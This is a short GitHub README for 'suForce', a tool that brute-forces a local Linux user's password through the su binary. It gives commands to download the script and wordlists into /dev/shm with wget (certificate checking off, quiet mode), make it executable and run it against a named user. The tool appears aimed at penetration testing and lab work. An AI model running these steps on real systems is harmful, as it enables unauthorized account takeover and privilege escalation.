# suForce

![GitHub stars](https://img.shields.io/github/stars/d4t4s3c/suForce?logoColor=yellow) ![GitHub forks](https://img.shields.io/github/forks/d4t4s3c/suForce?logoColor=purple) ![GitHub watchers](https://img.shields.io/github/watchers/d4t4s3c/suForce?logoColor=green)</br>
![GitHub commit activity (branch)](https://img.shields.io/github/commit-activity/m/d4t4s3c/suForce) ![GitHub contributors](https://img.shields.io/github/contributors/d4t4s3c/suForce)

Obtain a **user's** system **password**, this tool uses the [su](https://manpages.ubuntu.com/manpages/xenial/man1/su.1.html) binary to perform a **brute force attack** until a successful collision occurs.

![](/img/img.png)

---

## Download suForce

```sh
cd /dev/shm
wget --no-check-certificate -q "https://raw.githubusercontent.com/d4t4s3c/suForce/refs/heads/main/suForce"
chmod +x suForce
```

## Download Wordlist (Optional)

```sh
wget --no-check-certificate -q "https://raw.githubusercontent.com/d4t4s3c/suForce/refs/heads/main/techyou.txt"
wget --no-check-certificate -q "https://raw.githubusercontent.com/d4t4s3c/suForce/refs/heads/main/top12000.txt"
```

## Usage

```sh
./suForce -u <USER> -w <WORDLIST>
```

---
